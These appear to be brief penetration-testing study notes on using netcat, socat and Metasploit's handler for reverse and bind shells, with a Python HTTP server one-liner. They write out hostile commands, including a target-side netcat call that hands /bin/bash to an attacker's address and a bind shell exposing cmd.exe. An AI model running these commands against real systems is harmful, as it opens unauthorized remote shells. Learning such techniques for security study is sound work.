umNetcat is used for receiving reverse shells and connecting to the remote ports attached to the bind shells

Socat (more stble then netcat)
	syntax is more difficult

Metasploit (netcat/socat): `auxiliary/multi/handler`

# Reverse Shells
for when the target is forced to execute code that connects to your computer
	can be bypass firewalls that prevent you from connecting

Done on the attacking machine:
`sudo nc -lvnp 443`
listen (for inbound connects), verbose, numeric id address (no dns), port number

Done on the target machine:
`netcat [local-ip] [port] -e /bin/bash`
`-e` specifies what filename to execute after connecting

# Bind Shells
for when the code executed on the target is used to start a listener attached to the shell of the target
	may be prevented by the firewall
	you connect to the port that the code has opened on

Done on the target:
`netcat -lvnp [port] -e "cmd.exe"`

Done on the attacking machine:
`netcat [machine-ip] [port]`

## Creating a Python Server
`sudo python3 -m http.server 80`